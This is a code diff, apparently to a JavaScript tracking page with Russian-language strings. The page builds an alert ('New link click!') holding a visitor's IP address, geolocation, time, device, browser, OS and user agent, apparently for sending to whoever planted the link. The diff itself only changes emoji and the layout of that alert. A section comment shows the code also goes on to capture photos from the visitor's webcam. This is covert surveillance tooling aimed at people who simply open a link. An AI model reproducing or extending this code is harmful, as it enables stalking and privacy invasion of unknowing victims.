@@ -41,9 +41,9 @@
     let deviceType = "не определено";
     
     if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
-        deviceType = "📱 Телефон";
+        deviceType = " Телефон";
     } else if (/Windows|Mac|Linux|X11/i.test(userAgent)) {
-        deviceType = "💻 Компьютер";
+        deviceType = " Компьютер";
     }
     
     let browser = "неизвестно";
@@ -69,18 +69,13 @@
     const textMessage = `🚨 Новый переход по ссылке!
 
 🌐IP: ${ipAddress}
- └─🌍 Гео: ${geo}
- 
+ ├─🌍 Гео: ${geo}
  ├─🕐 Время: ${timeStr}
- ├─📁 Устройство: ${deviceType}
- └─🗂 Браузер: ${browser}
+ ├─🔰 Устройство: ${deviceType}
+ └─🎭 Браузер: ${browser}
  
- ├─🖥 ОС: ${os}
- └─🎭 UserAgent: ${shortUA}
-
-━━━━━━━━━━━━━━━━━━━━━━
-🖇 Ссылка: ${window.location.href}
-🛠 Реферер: ${document.referrer || "прямой переход"}`;
+ ├─💾 ОС: ${os}
+ └─🖥 UserAgent: ${shortUA}
 
     // ========== 5. Захват фото с вебкамеры ==========
     let photoBlob = null;
